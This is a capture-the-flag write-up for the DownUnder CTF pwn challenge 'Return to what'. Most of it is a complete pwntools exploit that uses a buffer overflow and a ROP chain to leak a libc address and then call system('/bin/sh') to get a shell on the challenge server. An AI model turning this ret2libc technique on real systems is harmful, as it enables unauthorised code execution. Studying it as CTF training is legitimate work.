## DownUnder CTF: Return to what [pwn]
> This will show my friends!

#### Initial analysis of the security measures for the binary show that NX is enabled. With the aforementioned information, we can safely assume that the title of the challenge is a hint to what we should do: ret2libc. Our plan then is to find some gadgets, leak some addresses from the server, check what libc version it is with `libc.blukat.me`, then create a final rop chain to call system.

##### exploit.py
```python
from pwn import *

#:
p = remote('chal.duc.tf',30003)
print(p.recv())

#:
binary = ELF('./return-to-what', checksec = False)
puts_plt = binary.symbols['puts']
puts_got = binary.got['puts']
main_plt = binary.symbols['main']

#: Stage 1: Leak address of puts
pop_rdi = 0x000000000040122b
ret = 0x0000000000401016

exploit = cyclic(56)
exploit += p64(ret)
exploit += p64(pop_rdi)
exploit += p64(puts_got)
exploit += p64(puts_plt)
exploit += p64(main_plt)

p.sendline(exploit)
leak = int('0x' + hex(u64(p.recv()[:7].ljust(8, '\x00')))[3:], 16)
print('[i] LIBC leak: {}'.format(hex(leak)))

#: Stage 2: Call system('/bin/sh')
libc = ELF('libc6_2.27-3ubuntu1_amd64.so', checksec = False)
libc.address = leak - libc.symbols['puts']
print('[i] LIBC base: {}'.format(hex(libc.address)))

exploit = cyclic(56)
exploit += p64(pop_rdi)
exploit += p64(libc.search('/bin/sh').next())
exploit += p64(libc.symbols['system'])

p.sendline(exploit)
p.interactive()
```
